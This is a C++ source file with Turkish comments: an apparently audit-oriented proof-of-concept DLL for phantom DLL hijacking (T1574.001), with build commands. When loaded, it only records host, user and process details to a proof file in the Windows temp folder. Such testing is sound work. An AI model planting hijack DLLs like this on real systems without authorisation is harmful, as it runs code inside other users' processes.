// TextShapingProof.cpp — Phantom DLL Hijacking Audit Payload
// MITRE ATT&CK: T1574.001
//
// Amac  : Sadece kanit dosyasi yazar, baska hicbir islem yapmaz.
// Derleme (MSVC — Developer Command Prompt):
//   cl /LD TextShapingProof.cpp /link /OUT:TextShapingProof.dll
// Derleme (MinGW):
//   g++ -shared -o TextShapingProof.dll TextShapingProof.cpp -luser32
//
// Cikti dosyasini PhantomDllHijackProbe.exe ile ayni klasore koyun.

#include <windows.h>
#include <stdio.h>
#include <time.h>

#define PROOF_PATH "C:\\Windows\\Temp\\phantom_dll_proof.txt"

static void WriteProof(HINSTANCE hDll)
{
    char computerName[256] = {0};
    char userName[256]     = {0};
    char processPath[MAX_PATH] = {0};
    char dllPath[MAX_PATH]     = {0};
    DWORD sz = 256;

    GetComputerNameA(computerName, &sz);
    sz = 256;
    GetUserNameA(userName, &sz);
    GetModuleFileNameA(NULL,   processPath, MAX_PATH); // yukleyen proses
    GetModuleFileNameA(hDll,   dllPath,     MAX_PATH); // bu DLL'in yolu

    DWORD pid  = GetCurrentProcessId();
    DWORD tid  = GetCurrentThreadId();

    time_t now = time(NULL);
    struct tm *lt = localtime(&now);
    char timeStr[64];
    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", lt);

    FILE *f = fopen(PROOF_PATH, "w");
    if (!f) return;

    fprintf(f, "=== PHANTOM DLL HIJACKING — AUDIT KANITI ===\n");
    fprintf(f, "MITRE ATT&CK : T1574.001\n");
    fprintf(f, "Teknik       : Phantom DLL Hijacking (WindowsApps)\n");
    fprintf(f, "DLL Adi      : TextShaping.dll\n");
    fprintf(f, "-----------------------------------------------\n");
    fprintf(f, "Tarih/Saat   : %s\n",  timeStr);
    fprintf(f, "Bilgisayar   : %s\n",  computerName);
    fprintf(f, "Kullanici    : %s\n",  userName);
    fprintf(f, "Proses       : %s\n",  processPath);
    fprintf(f, "PID          : %lu\n", pid);
    fprintf(f, "TID          : %lu\n", tid);
    fprintf(f, "DLL Konumu   : %s\n",  dllPath);
    fprintf(f, "-----------------------------------------------\n");
    fprintf(f, "Etki         : DLL arama sirasinda phantom konuma\n");
    fprintf(f, "               yerlestirilen sahte DLL yuklendi.\n");
    fprintf(f, "==============================================\n");

    fclose(f);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinstDLL);
        WriteProof(hinstDLL);
    }
    return TRUE;
}
